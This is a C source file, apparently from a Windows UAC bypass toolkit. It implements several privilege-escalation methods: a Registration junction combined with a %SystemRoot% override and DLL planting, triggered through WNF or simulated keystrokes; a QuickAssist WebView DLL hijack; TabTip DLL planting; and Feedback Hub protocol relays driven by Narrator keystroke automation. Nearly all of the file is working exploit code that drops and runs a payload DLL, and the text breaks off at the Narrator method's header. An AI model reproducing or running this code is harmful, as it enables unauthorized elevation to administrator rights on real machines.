/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025 - 2026
*
*  TITLE:       r41n3rzuf477.C
*
*  VERSION:     3.71
*
*  DATE:        22 Jul 2026
*
*  UAC bypass methods from R41N3RZUF477.
*
*  For description please visit original URL
*
*  https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
*  https://github.com/R41N3RZUF477/QuickAssist_UAC_Bypass
*  https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass
*  https://github.com/R41N3RZUF477/TabTip_UAC_Bypass
*  https://github.com/R41N3RZUF477/Narrator_UAC_Bypass
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "encresource.h"

BOOL ucmxTriggerTaskWNF(
    _In_ PWNF_STATE_NAME state
)
{
    NTSTATUS status;
    ULONG info = 0;

    status = NtQueryWnfStateNameInformation(state,
        WnfInfoStateNameExist,
        NULL,
        &info,
        sizeof(info));

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    info = 0;
    status = NtQueryWnfStateNameInformation(state,
        WnfInfoSubscribersPresent,
        NULL,
        &info,
        sizeof(info));

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    status = NtUpdateWnfStateData(state,
        NULL,
        0,
        NULL,
        NULL,
        0,
        0);

    return NT_SUCCESS(status);
}

BOOL ucmxCreateRegistrationJunction(
    _In_ WCHAR* BasePath
)
{
    BOOL bResult = FALSE;
    WCHAR szJunctionPath[MAX_PATH * 2];
    WCHAR szRegDb[MAX_PATH * 2];
    HANDLE directoryHandle = NULL;

    UNICODE_STRING      usDirectoryName;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    if (_strlen(BasePath) > 100)
        return FALSE;

    _strcpy(szJunctionPath, L"\\??\\");
    _strcat(szJunctionPath, BasePath);
    supConcatenatePaths(szJunctionPath, REGDB_DIR, MAX_PATH);

    do {
        // %systemroot%\Registration
        _strcpy(szRegDb, L"\\??\\");
        _strcat(szRegDb, USER_SHARED_DATA->NtSystemRoot);
        supConcatenatePaths(szRegDb, REGDB_DIR, MAX_PATH);

        RtlInitUnicodeString(&usDirectoryName, szJunctionPath);
        InitializeObjectAttributes(&ObjectAttributes, &usDirectoryName,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        if (!NT_SUCCESS(supCreateDirectory(
            &directoryHandle,
            &ObjectAttributes,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)))
        {
            break;
        }

        if (!supSetMountPoint(directoryHandle,
            szRegDb,
            L""))
        {
            break;
        }

        bResult = TRUE;

    } while (FALSE);

    if (directoryHandle)
        NtClose(directoryHandle);

    if (!bResult) {
        supRemoveDirectory(szJunctionPath);
    }

    return bResult;
}

BOOL ucmxDeleteRegistrationJunction(
    _In_ WCHAR* BasePath
)
{
    WCHAR szJunctionPath[MAX_PATH * 2];
    HANDLE directoryHandle;

    _strcpy(szJunctionPath, BasePath);
    supConcatenatePaths(szJunctionPath, REGDB_DIR, MAX_PATH);
    directoryHandle = supOpenDirectoryForReparse(szJunctionPath);
    if (directoryHandle) {
        supDeleteMountPoint(directoryHandle);
        NtClose(directoryHandle);
        return supRemoveDirectory(szJunctionPath);
    }

    return FALSE;
}

#define WNF_SHEL_TRACE_REQUESTED    0x0D83063EA3B8F075
#define WNF_UC_CONSENT_ITEM_CHANGED 0x41C60D38A3BC0875

NTSTATUS ucmRegistrationProxyExecute(
    _In_ LPCWSTR ProxyDllName,
    _In_ PWNF_STATE_NAME StateName,
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fDirCreated = FALSE, fJunctionCreated = FALSE;
    BOOL fEnvSet = FALSE, fUseSendInput = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    SIZE_T nLen, payloadDirNameLen = 0;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR szPayloadDir[MAX_PATH * 2];
    UNICODE_STRING uStrProcessName = RTL_CONSTANT_STRING(TASKHOSTW_EXE);

    INPUT inputs[8];

    do {

        //
        // Create %TEMP%\Registration junction -> %SystemRoot%\Registration.
        //
        ucmxDeleteRegistrationJunction(g_ctx->szTempDirectory);
        if (!ucmxCreateRegistrationJunction(g_ctx->szTempDirectory))
            break;

        fJunctionCreated = TRUE;

        //
        // Create redirected %TEMP%\System32 directory.
        //
        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
        _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
        payloadDirNameLen = _strlen(szPayloadDir);

        if (!CreateDirectory(szPayloadDir, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        fDirCreated = TRUE;

        //
        // Drop payload.
        //
        _strcat(szPayloadDir, TEXT("\\"));
        _strcat(szPayloadDir, ProxyDllName);

        if (!supWriteBufferToFile(
            szPayloadDir,
            ProxyDll,
            ProxyDllSize))
        {
            break;
        }

        //
        // Override %SystemRoot%.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);

        nLen = _strlen(szBuffer);
        if (szBuffer[nLen - 1] == L'\\')
            szBuffer[nLen - 1] = 0;

        fEnvSet = supSetEnvVariable(
            FALSE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT,
            szBuffer);

        if (!fEnvSet)
            break;

        //
        // Kill elevated taskhost instances.
        //
        supEnumProcessesForSession(
            NtCurrentPeb()->SessionId,
            (pfnEnumProcessCallback)supEnumTaskhostTasksCallback,
            (PVOID)&uStrProcessName);

        fUseSendInput = (StateName->Value == WNF_SHEL_TRACE_REQUESTED);

        //
        // Trigger task via WNF
        //
        if (!ucmxTriggerTaskWNF(StateName)) {

            //
            // Trigger shell trace task by input.
            //
            if (fUseSendInput) {
                RtlSecureZeroMemory(inputs, sizeof(inputs));

                //
                // Simulate Shift+Ctrl+Win+T.
                //
                inputs[0].type = INPUT_KEYBOARD;
                inputs[0].ki.wVk = VK_LSHIFT;

                inputs[1].type = INPUT_KEYBOARD;
                inputs[1].ki.wVk = VK_LCONTROL;

                inputs[2].type = INPUT_KEYBOARD;
                inputs[2].ki.wVk = VK_LWIN;

                inputs[3].type = INPUT_KEYBOARD;
                inputs[3].ki.wVk = 'T';

                inputs[4].type = INPUT_KEYBOARD;
                inputs[4].ki.wVk = 'T';
                inputs[4].ki.dwFlags = KEYEVENTF_KEYUP;

                inputs[5].type = INPUT_KEYBOARD;
                inputs[5].ki.wVk = VK_LWIN;
                inputs[5].ki.dwFlags = KEYEVENTF_KEYUP;

                inputs[6].type = INPUT_KEYBOARD;
                inputs[6].ki.wVk = VK_LCONTROL;
                inputs[6].ki.dwFlags = KEYEVENTF_KEYUP;

                inputs[7].type = INPUT_KEYBOARD;
                inputs[7].ki.wVk = VK_LSHIFT;
                inputs[7].ki.dwFlags = KEYEVENTF_KEYUP;

                SendInput(RTL_NUMBER_OF(inputs), inputs, sizeof(INPUT));
            }
        }

        Sleep(5000);
        MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    supSetGlobalCompletionEvent();

    //
    // Restore environment.
    //
    if (fEnvSet) {
        supSetEnvVariable(
            TRUE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT,
            NULL);
    }

    //
    // Remove payload.
    //
    if (fDirCreated) {
        DeleteFile(szPayloadDir);
        szPayloadDir[payloadDirNameLen] = 0;
        supRemoveDirectory(szPayloadDir);
    }

    //
    // Remove Registration junction.
    //
    if (fJunctionCreated) {
        ucmxDeleteRegistrationJunction(g_ctx->szTempDirectory);
    }

    return MethodResult;
}

/*
* ucmUnifiedConsentMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack and dll planting.
* https://github.com/R41N3RZUF477/UnifiedConsent_UAC_Bypass
*
*/
NTSTATUS ucmUnifiedConsentMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    WNF_STATE_NAME state;

    state.Value = WNF_UC_CONSENT_ITEM_CHANGED;
    return ucmRegistrationProxyExecute(UNIFIEDCONSENT_DLL, &state, ProxyDll, ProxyDllSize);
}

/*
* ucmRequestTraceMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack and dll planting.
* https://github.com/R41N3RZUF477/RequestTrace_UAC_Bypass
*
*/
NTSTATUS ucmRequestTraceMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    WNF_STATE_NAME state;

    if (!supIsTaskExists(TEXT("Microsoft\\Windows\\PerformanceTrace"), TEXT("RequestTrace"))) {
        supSetGlobalCompletionEvent();
        return STATUS_NOT_SUPPORTED;
    }

    state.Value = WNF_SHEL_TRACE_REQUESTED;
    return ucmRegistrationProxyExecute(PERFORMANCETRACEHANDLER_DLL, &state, ProxyDll, ProxyDllSize);
}

/*
* ucmxModifyWebviewExecutableFolderPolicy
*
* Purpose:
*
* Alter WebView BrowserExecutableFolder parameter.
*
*/
BOOLEAN ucmxModifyWebviewExecutableFolderPolicy(
    _In_ LPCWSTR lpPayloadPath
)
{
    BOOLEAN bResult = FALSE;
    HKEY hKey = NULL;

    if (ERROR_SUCCESS == RegCreateKeyEx(HKEY_CURRENT_USER,
        T_WEBVIEW_POLICY,
        0, NULL,
        REG_OPTION_VOLATILE,
        MAXIMUM_ALLOWED,
        NULL,
        &hKey,
        NULL))
    {
        bResult = (RegSetValueEx(hKey,
            QUICKASSIST_EXE,
            0, REG_SZ,
            (const BYTE*)lpPayloadPath,
            ((DWORD)_strlen(lpPayloadPath) * sizeof(WCHAR)) + sizeof(UNICODE_NULL)) == ERROR_SUCCESS);

        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* ucmxRunQuickAssist
*
* Purpose:
*
* Execute quick assist through direct exe start or protocol.
*
*/
HANDLE ucmxRunQuickAssist()
{
    WCHAR szBuffer[MAX_PATH * 2];
    SHELLEXECUTEINFO shinfo;

    _strcpy(szBuffer, g_ctx->szSystemDirectory);
    _strcat(szBuffer, QUICKASSIST_EXE);

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpVerb = NULL;
    shinfo.lpParameters = NULL;
    shinfo.nShow = SW_MINIMIZE;

    if (GetFileAttributes(szBuffer) != INVALID_FILE_ATTRIBUTES) {
        shinfo.lpFile = szBuffer;
    }
    else {
        shinfo.lpFile = T_QUICKASSIST;
    }

    if (ShellExecuteEx(&shinfo)) {
        return shinfo.hProcess;
    }

    return NULL;
}

/*
* ucmQuickAssistMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack and dll planting.
* https://github.com/R41N3RZUF477/QuickAssist_UAC_Bypass
*
*/
NTSTATUS ucmQuickAssistMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fDirCreated = FALSE, fEnvSet = FALSE;
    HANDLE hProcess;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    WCHAR szPayloadPath[MAX_PATH * 2];
    WCHAR szPayloadFile[MAX_PATH * 2];

    do {

        //
        // Select payload entry point.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_R41N3RZUF477,
            FALSE))
        {
            break;
        }

        //
        // Create destination dir "EBWebView\x64" in %temp%.
        //
        _strcpy(szPayloadPath, g_ctx->szTempDirectory);
        _strcat(szPayloadPath, WEBVIEW_DIR);
        if (!CreateDirectory(szPayloadPath, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        _strcat(szPayloadPath, L"\\x64");
        if (!CreateDirectory(szPayloadPath, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        //
        // Drop payload and alter it version info block.
        //
        _strcpy(szPayloadFile, szPayloadPath);
        _strcat(szPayloadFile, TEXT("\\"));
        _strcat(szPayloadFile, EMBEDDEDBROWSERWEBVIEW_DLL);
        if (!supWriteBufferToFile(szPayloadFile, ProxyDll, ProxyDllSize))
            break;

        fDirCreated = TRUE;

        if (!supReplaceVersionInfo(szPayloadFile, (PBYTE)g_webviewvsinfo, sizeof(g_webviewvsinfo), 'qass'))
            break;

        //
        // Relay WebView.
        //
        if (!ucmxModifyWebviewExecutableFolderPolicy(szPayloadPath)) {
            fEnvSet = supSetEnvVariable(FALSE, T_VOLATILE_ENV, WEBVIEW2_FOLRDER_VAR, g_ctx->szTempDirectory);
            if (fEnvSet == FALSE)
                break;
        }

        //
        // Run quick asssist.
        //
        hProcess = ucmxRunQuickAssist();
        if (hProcess) {
            if (WaitForSingleObject(hProcess, 15000) != WAIT_OBJECT_0) {
                TerminateProcess(hProcess, 0);
            }
            CloseHandle(hProcess);
        }

        MethodResult = STATUS_SUCCESS;

    } while (FALSE);

    supSetGlobalCompletionEvent();

    if (fEnvSet)
        supSetEnvVariable(TRUE, T_VOLATILE_ENV, WEBVIEW2_FOLRDER_VAR, NULL);

    if (fDirCreated) {
        _strcpy(szPayloadPath, g_ctx->szTempDirectory);
        _strcat(szPayloadPath, WEBVIEW_DIR);
        supRemoveDirectoryRecursive(szPayloadPath);
    }

    return MethodResult;
}

/*
* ucmTabTipMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack, dll planting and UIAccess abuse.
* https://github.com/R41N3RZUF477/TabTip_UAC_Bypass
*
*/
NTSTATUS ucmTabTipMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    BOOL fDirCreated = FALSE, fEnvSet = FALSE;
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
    SIZE_T i, nLen;
    PWSTR commonPath = NULL;

    SHELLEXECUTEINFO shinfo;

    WCHAR szBuffer[MAX_PATH * 2];
    WCHAR szPayloadDir[MAX_PATH * 2];
    UNICODE_STRING uStrProcessName = RTL_CONSTANT_STRING(TABTIP_EXE);

    LPWSTR knownDlls[] = { ATFD_DLL, WINDOWS_STORAGE_DLL, RSAENH_DLL };

    do {
        //
        // Select payload entry point.
        //
        if (!supReplaceDllEntryPoint(
            ProxyDll,
            ProxyDllSize,
            FUBUKI_ENTRYPOINT_R41N3RZUF477,
            FALSE))
        {
            break;
        }

        //
        // Create redirected %TEMP%\System32 directory.
        //
        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
        _strcat(szPayloadDir, SYSTEM32_DIR_NAME);
        if (!CreateDirectory(szPayloadDir, NULL)) {
            if (GetLastError() != ERROR_ALREADY_EXISTS)
                break;
        }

        fDirCreated = TRUE;

        //
        // Drop payload.
        //
        _strcpy(szBuffer, szPayloadDir);
        _strcat(szBuffer, TEXT("\\"));
        nLen = _strlen(szBuffer);
        for (i = 0; i < RTL_NUMBER_OF(knownDlls); i++) {
            szBuffer[nLen] = 0;
            _strcat(szBuffer, knownDlls[i]);
            if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
                break;
        }

        //
        // Override %SystemRoot%.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);

        nLen = _strlen(szBuffer);
        if (szBuffer[nLen - 1] == L'\\')
            szBuffer[nLen - 1] = 0;

        fEnvSet = supSetEnvVariable(
            FALSE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT,
            szBuffer);

        if (!fEnvSet)
            break;

        //
        // Kill TabTip instances.
        //
        supEnumProcessesForSession(
            NtCurrentPeb()->SessionId,
            (pfnEnumProcessCallback)supTerminateProcessCallback,
            (PVOID)&uStrProcessName);

        //
        // Run target.
        //
        if (SUCCEEDED(SHGetKnownFolderPath(
            &FOLDERID_ProgramFilesCommon,
            0,
            NULL,
            &commonPath)))
        {
            _strcpy(szBuffer, commonPath);
            CoTaskMemFree(commonPath);
            supConcatenatePaths(szBuffer, TEXT("Microsoft Shared\\ink\\"), MAX_PATH);
            _strcat(szBuffer, TABTIP_EXE);

            RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
            shinfo.cbSize = sizeof(shinfo);
            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
            shinfo.lpVerb = OPEN_VERB;
            shinfo.nShow = SW_SHOWDEFAULT;
            shinfo.lpFile = szBuffer;

            if (ShellExecuteEx(&shinfo)) {
                Sleep(5000);
                MethodResult = STATUS_SUCCESS;

                TerminateProcess(shinfo.hProcess, 0);
                CloseHandle(shinfo.hProcess);
            }
        }

    } while (FALSE);

    supSetGlobalCompletionEvent();

    //
    // Restore environment.
    //
    if (fEnvSet) {
        supSetEnvVariable(
            TRUE,
            T_VOLATILE_ENV,
            T_SYSTEMROOT,
            NULL);
    }

    //
    // Remove payload.
    //
    if (fDirCreated) {
        supRemoveDirectoryRecursive(szPayloadDir);
    }

    return MethodResult;
}

/*
* ucmxDeleteRelayFeedbackHubKey
*
* Purpose:
*
* Delete Feedback Hub protocol key.
*
*/
BOOL ucmxDeleteRelayFeedbackHubKey(
    _In_ LPCWSTR KeyName
)
{
    BOOL bResult = FALSE;
    HKEY hKey = NULL;

    if (!RegOpenKeyEx(HKEY_CURRENT_USER, T_SOFTWARE_CLASSES, 0,
        DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey))
    {
        bResult = RegDeleteTree(hKey, KeyName);
        RegCloseKey(hKey);
    }
    return bResult;
}

/*
* ucmxCreateRelayFeedbackHubKey
*
* Purpose:
*
* Create Feedback Hub protocol relay registry key.
*
*/
BOOL ucmxCreateRelayFeedbackHubKey(
    _In_ LPCWSTR KeyName,
    _In_ LPWSTR CmdLine
)
{
    BOOL bResult = FALSE;
    HKEY key = NULL;
    HKEY subKey = NULL;
    HKEY commandKey = NULL;
    DWORD cbData;
    WCHAR szKey[MAX_PATH];

    do {

        if (ERROR_SUCCESS != RegOpenKeyEx(
            HKEY_CURRENT_USER,
            T_SOFTWARE_CLASSES,
            0,
            KEY_WRITE | KEY_READ,
            &key))
        {
            break;
        }

        if (ERROR_SUCCESS != RegCreateKeyEx(
            key,
            KeyName,
            0,
            NULL,
            0,
            KEY_WRITE | KEY_READ,
            NULL,
            &subKey,
            NULL))
        {
            break;
        }

        _strcpy(szKey, TEXT("shell\\open\\"));
        _strcat(szKey, T_SHELL_COMMAND);

        if (ERROR_SUCCESS != RegCreateKeyEx(
            subKey,
            szKey,
            0,
            NULL,
            0,
            KEY_WRITE | KEY_READ,
            NULL,
            &commandKey,
            NULL))
        {
            break;
        }

        cbData = (DWORD)(_strlen(CmdLine) * sizeof(WCHAR) + sizeof(WCHAR));

        if (ERROR_SUCCESS != RegSetValueEx(
            commandKey,
            NULL,
            0,
            REG_SZ,
            (const BYTE*)CmdLine,
            cbData))
        {
            break;
        }

        bResult = TRUE;

    } while (FALSE);

    if (commandKey)
        RegCloseKey(commandKey);

    if (subKey)
        RegCloseKey(subKey);

    if (key)
        RegCloseKey(key);

    if (!bResult)
        ucmxDeleteRelayFeedbackHubKey(KeyName);

    return bResult;
}

/*
* ucmxGetFeedbackProtocolProgIDPath
*
* Purpose:
*
* Query Feedback Hub protocol ProgID registry path.
*
*/
BOOL ucmxGetFeedbackProtocolProgIDPath(
    _In_ LPWSTR Path,
    _In_ DWORD PathLength
)
{
    BOOL bResult = FALSE;
    LPCWSTR FeedbackProtocol = T_FEEDBACK_HUB_PROTOCOL;
    WCHAR szBasePath[MAX_PATH];
    DWORD BasePathLength;

    RtlSecureZeroMemory(szBasePath, sizeof(szBasePath));

    _strcpy(szBasePath, T_SOFTWARE_CLASSES);
    _strcat(szBasePath, TEXT("\\"));

    BasePathLength = (DWORD)_strlen(szBasePath);

    if (Path == NULL || PathLength <= BasePathLength)
        return FALSE;

    _strcpy(Path, szBasePath);
    PathLength -= BasePathLength;

    if (SUCCEEDED(AssocQueryString(
        ASSOCF_NONE,
        ASSOCSTR_PROGID,
        FeedbackProtocol,
        NULL,
        &Path[BasePathLength],
        &PathLength)))
    {
        bResult = TRUE;
    }
    else {
        //
        // Append protocol if not found.
        //
        if (PathLength > (DWORD)_strlen(FeedbackProtocol)) {
            _strcpy(&Path[BasePathLength], FeedbackProtocol);
            bResult = TRUE;
        }
    }

    return bResult;
}

/*
* ucmxDeleteFeedbackRelayCurVerRedirect
*
* Purpose:
*
* Remove CurVer redirect from Feedback Relay protocol registration.
*
*/
BOOL ucmxDeleteFeedbackRelayCurVerRedirect(
    VOID
)
{
    BOOL bResult = FALSE;
    HKEY key = NULL;
    WCHAR progid[100];

    progid[0] = 0;
    if (!ucmxGetFeedbackProtocolProgIDPath(
        progid,
        ARRAYSIZE(progid)))
    {
        return FALSE;
    }

    if (ERROR_SUCCESS == RegOpenKeyEx(
        HKEY_CURRENT_USER,
        progid,
        0,
        KEY_WRITE | DELETE,
        &key))
    {
        if (ERROR_SUCCESS == RegDeleteKey(
            key,
            T_CURVER))
        {
            bResult = TRUE;
        }

        RegCloseKey(key);
    }

    return bResult;
}

/*
* ucmxCreateFeedbackRelay
*
* Purpose:
*
* Create Feedback Hub protocol relay registration.
*
*/
BOOL ucmxCreateFeedbackRelay(
    _In_ LPCWSTR KeyName
)
{
    BOOL bResult = FALSE;
    BOOL keyCreated = FALSE;
    DWORD disposition = 0;
    HKEY key = NULL;
    HKEY curverKey = NULL;
    WCHAR progid[100];

    progid[0] = 0;

    do {

        if (!ucmxGetFeedbackProtocolProgIDPath(
            progid,
            ARRAYSIZE(progid)))
        {
            break;
        }

        //
        // Create HKEY_CURRENT_USER\Software\Classes\feedback-hub
        //
        if (ERROR_SUCCESS != RegCreateKeyEx(
            HKEY_CURRENT_USER,
            progid,
            0,
            NULL,
            0,
            KEY_WRITE | KEY_READ,
            NULL,
            &key,
            &disposition))
        {
            break;
        }

        if (disposition == REG_CREATED_NEW_KEY)
            keyCreated = TRUE;

        if (keyCreated) {

            //
            // Set empty "URL Protocol"
            //
            if (ERROR_SUCCESS != RegSetValueEx(
                key,
                T_URL_PROTOCOL,
                0,
                REG_SZ,
                (const BYTE*)L"",
                sizeof(WCHAR)))
            {
                break;
            }
        }

        //
        // HKEY_CURRENT_USER\Software\Classes\feedback-hub\CurVer
        //
        if (ERROR_SUCCESS != RegCreateKeyEx(
            key,
            T_CURVER,
            0,
            NULL,
            0,
            KEY_WRITE | KEY_READ,
            NULL,
            &curverKey,
            NULL))
        {
            break;
        }

        //
        // Set ms-feedback at CurVer
        //
        if (ERROR_SUCCESS != RegSetValueEx(
            curverKey,
            NULL,
            0,
            REG_SZ,
            (const BYTE*)KeyName,
            (DWORD)(_strlen(KeyName) * sizeof(WCHAR) + sizeof(WCHAR))))
        {
            break;
        }

        bResult = TRUE;

    } while (FALSE);

    if (curverKey)
        RegCloseKey(curverKey);

    if (key)
        RegCloseKey(key);

    if (!bResult && keyCreated) {

        //
        // Remove incomplete relay registration.
        //
        ucmxDeleteRelayFeedbackHubKey(progid);
    }

    return bResult;
}

/*
* ucmxCreateRelayFeedBackHub
*
* Purpose:
*
* Create Feedback Hub protocol relay registration.
*
*/
BOOL ucmxCreateRelayFeedBackHub(
    _In_ LPCWSTR KeyName,
    _In_ LPWSTR CmdLine
)
{
    BOOL bResult = FALSE;

    do {

        if (!ucmxCreateRelayFeedbackHubKey(
            KeyName,
            CmdLine))
        {
            break;
        }

        if (!ucmxCreateFeedbackRelay(
            KeyName))
        {
            ucmxDeleteRelayFeedbackHubKey(KeyName);
            break;
        }

        bResult = TRUE;

    } while (FALSE);

    return bResult;
}

/*
* ucmxRemoveFeedBackHub
*
* Purpose:
*
* Remove Feedback Hub protocol relay registration.
*
*/
BOOL ucmxRemoveFeedBackHub(
    LPCWSTR KeyName
)
{
    BOOL bResult = TRUE;

    if (!ucmxDeleteRelayFeedbackHubKey(KeyName))
        bResult = FALSE;

    if (!ucmxDeleteFeedbackRelayCurVerRedirect())
        bResult = FALSE;

    return bResult;
}

/*
* ucmxSkipNarratorDialogs
*
* Purpose:
*
* Disable Narrator shortcut dialogs.
*
*/
BOOL ucmxSkipNarratorDialogs(
    VOID
)
{
    BOOL bResult = FALSE;
    HKEY key = NULL;
    HKEY subKey = NULL;
    DWORD regValue;

    do {

        if (ERROR_SUCCESS != RegCreateKeyEx(
            HKEY_CURRENT_USER,
            T_NARRATOR,
            0,
            NULL,
            0,
            KEY_WRITE | KEY_READ,
            NULL,
            &key,
            NULL))
        {
            break;
        }

        regValue = 1;

        if (ERROR_SUCCESS != RegSetValueEx(
            key,
            T_SHORTCUT_KEYS_DLG_STATE,
            0,
            REG_DWORD,
            (const BYTE*)&regValue,
            sizeof(DWORD)))
        {
            break;
        }

        regValue = 2;

        if (ERROR_SUCCESS != RegSetValueEx(
            key,
            T_SHORTCUT_KEYS_DLG_CNT,
            0,
            REG_DWORD,
            (const BYTE*)&regValue,
            sizeof(DWORD)))
        {
            break;
        }

        if (ERROR_SUCCESS != RegCreateKeyEx(
            key,
            T_NARRATOR_HOME,
            0,
            NULL,
            0,
            KEY_WRITE | KEY_READ,
            NULL,
            &subKey,
            NULL))
        {
            break;
        }

        regValue = 0;

        if (ERROR_SUCCESS != RegSetValueEx(
            subKey,
            T_AUTOSTART,
            0,
            REG_DWORD,
            (const BYTE*)&regValue,
            sizeof(DWORD)))
        {
            break;
        }

        bResult = TRUE;

    } while (FALSE);

    if (subKey)
        RegCloseKey(subKey);

    if (key)
        RegCloseKey(key);

    return bResult;
}

/*
* ucmxRunNarrator
*
* Purpose:
*
* Launch Narrator process.
*
*/
HANDLE ucmxRunNarrator(
    VOID
)
{
    HANDLE hProcess = NULL;
    WCHAR narratorPath[MAX_PATH];
    SHELLEXECUTEINFO sei;

    RtlSecureZeroMemory(narratorPath, sizeof(narratorPath));
    _strcpy(narratorPath, g_ctx->szSystemDirectory);
    supConcatenatePaths(narratorPath, NARRATOR_EXE, MAX_PATH);

    RtlSecureZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = narratorPath;
    sei.nShow = SW_MINIMIZE;

    if (ShellExecuteEx(&sei)) {
        hProcess = sei.hProcess;
    }

    return hProcess;
}

/*
* ucmxWaitForNarrator
*
* Purpose:
*
* Wait for Narrator window initialization.
*
*/
BOOL ucmxWaitForNarrator(
    _In_ DWORD Milliseconds
)
{
    DWORD i;

    for (i = 0; i < Milliseconds; i += 100) {

        Sleep(100);

        if (FindWindow(
            T_NARRATOR_UICLASS,
            NULL))
        {
            Sleep(100);
            break;
        }
    }

    return (i < Milliseconds);
}

#define UCM_KEYBOARD_INPUT_DELAY 100

/*
* ucmxSendKeyboardInput
*
* Purpose:
*
* Send a single keyboard input event with delay between events to emulate
* physical keyboard timing required by some applications.
*
*/
BOOL ucmxSendKeyboardInput(
    _In_ WORD VkKey,
    _In_ DWORD Flags,
    _In_ DWORD Delay
)
{
    INPUT ip;

    RtlSecureZeroMemory(&ip, sizeof(ip));

    ip.type = INPUT_KEYBOARD;
    ip.ki.wVk = VkKey;
    ip.ki.dwFlags = Flags;

    if (SendInput(
        1,
        &ip,
        sizeof(INPUT)) != 1)
    {
        return FALSE;
    }

    Sleep(Delay);
    return TRUE;
}

/*
* ucmxPressNarratorExitKeys
*
* Purpose:
*
* Send keyboard sequence to exit Narrator.
*
*/
BOOL ucmxPressNarratorExitKeys(
    VOID
)
{
    if (!ucmxSendKeyboardInput(
        VK_CAPITAL,
        0,
        UCM_KEYBOARD_INPUT_DELAY))
    {
        return FALSE;
    }

    if (!ucmxSendKeyboardInput(
        VK_ESCAPE,
        0,
        UCM_KEYBOARD_INPUT_DELAY))
    {
        return FALSE;
    }

    if (!ucmxSendKeyboardInput(
        VK_ESCAPE,
        KEYEVENTF_KEYUP,
        UCM_KEYBOARD_INPUT_DELAY))
    {
        return FALSE;
    }

    if (!ucmxSendKeyboardInput(
        VK_CAPITAL,
        KEYEVENTF_KEYUP,
        UCM_KEYBOARD_INPUT_DELAY))
    {
        return FALSE;
    }

    return TRUE;
}

/*
* ucmxPressFeedbackHubKeys
*
* Purpose:
*
* Send keyboard sequence to open Feedback Hub.
*
*/
BOOL ucmxPressFeedbackHubKeys(
    VOID
)
{
    if (!ucmxSendKeyboardInput(VK_CAPITAL, 0, UCM_KEYBOARD_INPUT_DELAY))
        return FALSE;

    if (!ucmxSendKeyboardInput(VK_LMENU, 0, UCM_KEYBOARD_INPUT_DELAY))
        return FALSE;

    if (!ucmxSendKeyboardInput('F', 0, UCM_KEYBOARD_INPUT_DELAY))
        return FALSE;

    if (!ucmxSendKeyboardInput('F', KEYEVENTF_KEYUP, UCM_KEYBOARD_INPUT_DELAY))
        return FALSE;

    if (!ucmxSendKeyboardInput(VK_LMENU, KEYEVENTF_KEYUP, UCM_KEYBOARD_INPUT_DELAY))
        return FALSE;

    if (!ucmxSendKeyboardInput(VK_CAPITAL, KEYEVENTF_KEYUP, UCM_KEYBOARD_INPUT_DELAY))
        return FALSE;

    return TRUE;
}

/*
* ucmxKillNarrator
*
* Purpose:
*
* Close Narrator process using keyboard sequence.
*
*/
BOOL ucmxKillNarrator(
    _In_ HANDLE Process
)
{
    BOOL bResult = FALSE;

    if (!ucmxPressNarratorExitKeys())
        return FALSE;

    if (Process == NULL)
        return TRUE;

    if (WaitForSingleObject(Process, 1000) == WAIT_OBJECT_0)
    {
        bResult = TRUE;
    }
    else {
        bResult = TerminateProcess(Process, 0);
    }

    return bResult;
}

/*
* ucmNarratorMethod
*
* Purpose:
*
* Bypass UAC by environment variables hijack, dll planting and UIAccess abuse.
* https://github.com/R41N3RZUF477/Narrator_UAC_Bypass
*
